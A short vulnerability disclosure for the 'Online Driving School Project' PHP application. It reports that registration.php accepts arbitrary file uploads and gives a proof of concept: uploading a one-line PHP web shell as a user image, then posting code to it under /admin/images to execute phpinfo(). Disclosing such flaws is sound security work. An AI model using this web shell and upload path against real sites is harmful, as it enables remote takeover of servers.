# Online Driving School Project In PHP Arbitrary File Upload And RCE

The Online Driving School Project is a simple mini project for driving institutes. The project contains admin, learners, and users. The user can either be police or victims/complainers. This project is for the institute of driver training first commenced its operations in managing the learners and people who want to take a good learners school as well as the admin which means the owner of the web application can select the best and near learners to the people and connect them both.

project link: https://code-projects.org/online-driving-school-project-in-php-with-source-code/



in /registration.php, an attacker can upload an arbitrary file

![](https://s2.loli.net/2022/09/05/tVGdwH4nvpD2soT.png)

which leads to remote code execution

## POC

First, register an user and choose a backdoor php file as user image

shell0.php

```php
<?php
eval($_POST[1]);
```





![](https://s2.loli.net/2022/09/05/NkBuGvirZOMpXoI.png)



then go to /admin/images/shell0.php and post shellcode

![](https://s2.loli.net/2022/09/05/Ifg8EmaFCJT1eck.png)



the code`phpinfo();`has been successfully executed. 